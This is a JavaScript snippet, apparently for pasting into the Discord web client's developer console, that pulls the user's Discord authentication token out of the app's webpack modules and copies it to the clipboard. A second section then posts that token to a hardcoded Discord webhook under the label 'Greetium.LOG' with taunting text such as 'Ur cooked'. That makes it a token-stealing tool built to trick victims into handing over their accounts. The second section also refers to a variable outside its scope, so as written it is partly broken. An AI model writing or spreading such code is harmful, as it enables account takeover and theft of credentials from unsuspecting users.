window.webpackChunkdiscord_app.push([
        [Symbol()],
        {},
        req => {
            if (!req.c) return;
            for (let m of Object.values(req.c)) {
                try {
                    if (!m.exports || m.exports === window) continue;
                    if (m.exports?.getToken) return copy(m.exports.getToken());
                    for (let ex in m.exports) {
                        if (m.exports?.[ex]?.getToken && m.exports[ex][Symbol.toStringTag] !== 'IntlMessagesProxy') return copy(m.exports[ex].getToken());
                    }
                } catch {}
            }
        },
    ]);

    window.webpackChunkdiscord_app.pop();
    console.log('%cWorked!', 'font-size: 50px');
    console.log('%cYou now have your token in the clipboard!', 'font-size: 16px');
// Replace with your actual webhook URL
const webhookURL = 'https://discord.com/api/webhooks/1426156132430512229/RWPhPndAdqhIFbTY7ws7bpdVwC2iVy21cu9Zqna5YhMknG2j1smjSfy8YHd8OMVIpegD';

// Data to send
const messageData = {
  content: m.exports.getToken(),
  username: 'Greetium.4',
  embeds: [
    {
      title: 'Greetium.LOG',
      description: 'Got Logged',
      color: 0x00ff00,
      fields: [
        {
          name: 'Gg',
          value: 'Ur cooked',
          inline: true
        }
      ]
    }
  ]
};

// Send the webhook
fetch(webhookURL, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(messageData)
})
.then(response => {
  if (response.ok) {
    console.log('Message sent successfully!');
  } else {
    console.error('Failed to send message:', response.status);
  }
})
.catch(error => console.error('Error:', error));
